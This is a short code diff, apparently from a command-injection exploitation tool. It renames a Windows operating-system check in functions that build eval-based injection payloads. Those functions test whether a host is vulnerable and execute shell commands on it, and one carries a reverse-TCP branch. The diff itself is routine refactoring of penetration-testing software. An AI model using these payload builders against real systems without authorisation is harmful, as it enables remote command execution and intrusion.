@@ -24,7 +24,7 @@ The available "eval-based" payloads.
 eval-based decision payload (check if host is vulnerable).
 """
 def decision(separator, TAG, randv1, randv2):
-  if settings.TARGET_OS == "win":
+  if settings.TARGET_OS == settings.OS.WINDOWS:
     if settings.SKIP_CALC: 
       if separator == "":
         payload = ("print(`echo " + TAG + "`." +
@@ -90,7 +90,7 @@ def decision(separator, TAG, randv1, randv2):
 __Warning__: The alternative shells are still experimental.
 """
 def decision_alter_shell(separator, TAG, randv1, randv2):
-  if settings.TARGET_OS == "win":
+  if settings.TARGET_OS == settings.OS.WINDOWS:
     python_payload = settings.WIN_PYTHON_INTERPRETER + " -c \"print(str(int(" + str(int(randv1)) + "%2B" + str(int(randv2)) + ")))\""
     if settings.SKIP_CALC: 
       if separator == "":
@@ -154,7 +154,7 @@ def decision_alter_shell(separator, TAG, randv1, randv2):
 Execute shell commands on vulnerable host.
 """
 def cmd_execution(separator, TAG, cmd):
-  if settings.TARGET_OS == "win":
+  if settings.TARGET_OS == settings.OS.WINDOWS:
     cmd = ( "for /f \"tokens=*\" %i in ('cmd /c " + 
             cmd +
             "') do @set /p = %i " + settings.CMD_NUL
@@ -197,7 +197,7 @@ def cmd_execution(separator, TAG, cmd):
 __Warning__: The alternative shells are still experimental.
 """
 def cmd_execution_alter_shell(separator, TAG, cmd):
-  if settings.TARGET_OS == "win":
+  if settings.TARGET_OS == settings.OS.WINDOWS:
     if settings.REVERSE_TCP:
       payload = (separator + cmd + settings.SINGLE_WHITESPACE
                 )
